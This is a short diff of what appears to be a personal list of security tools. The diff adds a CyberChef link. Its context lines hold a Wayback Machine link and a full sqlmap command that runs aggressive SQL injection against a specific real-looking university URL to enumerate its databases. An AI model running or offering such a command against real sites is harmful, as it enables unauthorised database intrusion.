@@ -51,3 +51,5 @@ SQL Map:sqlmap -u
 'https://cutm.ac.in/payu/skill/index.php?id=34' --batch --dbs --threads=5 --random-agent --risk=3 --level=5 --tamper=space2comment -v 3 --dbms  MySQL
 
 Wayback Url: https://web.archive.org
+
+Cyberchef : https://gchq.github.io/CyberChef/
